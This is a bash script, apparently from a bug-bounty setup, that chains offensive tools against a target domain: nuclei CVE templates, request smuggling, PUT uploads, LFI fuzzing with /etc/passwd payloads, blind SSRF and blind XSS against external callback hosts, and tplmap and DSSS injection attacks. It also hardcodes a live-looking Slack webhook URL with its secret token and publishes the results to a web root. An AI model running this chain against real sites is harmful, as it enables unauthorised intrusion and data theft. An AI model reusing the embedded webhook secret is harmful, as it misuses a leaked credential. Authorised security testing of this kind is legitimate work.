export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

cd /root/sudomy/$1_sub/Sudomy-Output/$1

#---------------------------------------------------------------------------------------------------------------------------------#
# Interesting ::gf pattern:: parameter > Deeping Vulnerable testing
# -- More gf profiles/patterns to maximize utility
printf '%b\n\n\n'; echo -e "$OKGREEN Step12 : Interesting ::gf pattern:: parameter > Deeping Vulnerable testing $RESET"
mkdir ./fuzz/temp; cp ./interest/paramsuniq ./fuzz/temp; cd ./fuzz/temp;
gf lfi | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-fileinclusion; 
gf redirect | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-openredirect;
gf sqli | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-sqli;
gf ssrf | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-ssrf;
gf idor | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-idor;
gf ssti | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-ssti;
gf rce | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-rce;
cd ../../; rm -rf ./fuzz/temp; 
find ./fuzz -size  0 -print -delete;


#---------------------------------------------------------------------------------------------------------------------------------#
# CVEs/Advisories
printf '%b\n\n\n'; echo -e "$OKGREEN Step3 - CVEs/Advisories Scanning $RESET"
nuclei -t /root/resource/nuclei-templates/cves/CVE-2018-1000129.yaml -l httpx.out -c 40 -silent -o ./automationtesting/CVE-2018-1000129
nuclei -t /root/resource/nuclei-templates/cves/CVE-2020-5410.yaml -l httpx.out -c 40 -silent -o ./automationtesting/CVE-2020-5410
nuclei -t /root/resource/nuclei-templates/cves/ springboot-actuators-jolokia-xxe.yaml -l httpx.out -c 40 -silent -o ./automationtesting/RCE-Jolokia


#---------------------------------------------------------------------------------------------------------------------------------#
# HTTP Request Smuggling / Desync
printf '%b\n\n\n'; echo -e "$OKGREEN Step4 - HTTP Request Smuggling / Desync $RESET"
cat httpx.out | smuggler | tee ./automationtesting/httpsmuggler-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# CORS Misconfig
printf '%b\n\n\n'; echo -e "$OKGREEN Step5 - CORS Misconfig Scan $RESET"
cat httpx.out | CORS-Scanner -o "google.com" | tee ./automationtesting/cors-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# Unrestricted PUT method 
printf '%b\n\n\n'; echo -e "$OKGREEN Step6 - Unrestricted PUT method $RESET"
echo "a" > put.txt; cp httpx.out hosts;
meg --header "User-Agent: Chrome/70.0.3538.77 Safari/537.36" -d 3000 -c 50 -X PUT /put.txt;
cat ./out/index | grep "200" | tee ./automationtesting/unrestricted-putMethod;
rm -rf ./out put.txt hosts;


#---------------------------------------------------------------------------------------------------------------------------------#
# Open Redirect & Blind SSRF
printf '%b\n\n\n'; echo -e "$OKGREEN Step7 - Open Redirect & Blind SSRF $RESET"
cp /root/resource/src/oobserver .; sed -i "s/target/$1/g" oobserver; target=./fuzz/fuzz-ssrf;
ffuf -w "$target:URL" -w oobserver -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" -mc 301,302 | \
tee openredirect-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# File Inclusion
printf '%b\n\n\n'; echo -e "$OKGREEN Step8 - File Inclusion $RESET"
target=./fuzz/fuzz-fileinclusion
ffuf -w "$target:URL" -w /root/resource/payload/lfi-etcpasswd -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" \
-mc 200 -o fileinclusion-temp1

gron fileinclusion-temp1 | tee fileinclusion-temp2
cat fileinclusion-temp2 | egrep -v "input |position|redirectlocation|resultfile|status| \{\}|url |lines|words|time|config|commandline" | \
tee ./automationtesting/fileinclusion-vuln
sed -e 's/json.results//g; s/;//g; ; s/"//g; s/input.//g; s/.URL =/\tUrl    =/g; s/.FUZZ =/\tFuzz   =/g; s/.length =/\tLength =/g' \
-i ./automationtesting/fileinclusion-vuln; rm fileinclusion-temp[1-2];


#---------------------------------------------------------------------------------------------------------------------------------#
# XSS Fuzzing [Reflected + Blind] -- kxss test special characters <"'>
printf '%b\n\n\n'; echo -e "$OKGREEN Step9 - XSS $RESET"
BLIND="https://missme3f.xss.ht"
cat ./interest/paramsuniq | kxss | tee ./automationtesting/xss-kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
sort -u | dalfox -w 50 pipe -b $BLIND -o ./automationtesting/xss-reflected; # dalfox --custom-payload <payloads.txt>


#---------------------------------------------------------------------------------------------------------------------------------#
# SSTI
printf '%b\n\n\n'; echo -e "$OKGREEN Step10 - SSTI $RESET"
for i in $(cat ./fuzz/fuzz-ssti); do python /root/tools/tplmap/tplmap.py -u $i; done | tee ./automationtesting/ssti-vuln-temp;
cat ./automationtesting/ssti-vuln-temp | egrep -v "\[\+|\!\]" | tee ./automationtesting/ssti-vuln;
rm ./automationtesting/ssti-vuln-temp;


#---------------------------------------------------------------------------------------------------------------------------------#
# SQLI Fuzzing (Error based)
printf '%b\n\n\n'; echo -e "$OKGREEN Step11 - SQLI $RESET"
for i in $(cat ./fuzz/fuzz-sqli); do python3 /root/tools/DSSS/dsss.py -u $i; done | tee ./automationtesting/sqli-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# Copying recon result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Vulnerable Testing Done :)"}' \
https://hooks.slack.com/services/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


#---------------------------------------------------------------------------------------------------------------------------------#
# Software Composition Analysis (SCA) -- dependencies vulnerability checking (based on CVE/advisories)
# -- From download js files ::retire,snyk
# retire --js --jspath ./juicyfiles/download/ --exitwith 13 --outputformat text --outputpath ./automationtesting/sca-retirejs;
# rm -rf node_modules package-lock.json;
#---------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------------#
# Host Header Injection (x-forwarded-host) > Open Redirect
# nuclei -t /root/resource/nuclei-templates/vulnerabilities/x-forwarded-host-injection.yaml -l httpx.out -c 40 -silent \
# -o ./automationtesting/hostheaderinjection-vuln;
#---------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------------#
# CRLF Injection > XSS, Cache-Poisoning
# nuclei -t /root/resource/nuclei-templates/vulnerabilities/crlf-injection.yaml -l httpx.out -c 40 -silent -o ./automationtesting/crlf-vuln;
#---------------------------------------------------------------------------------------------------------------------------------#







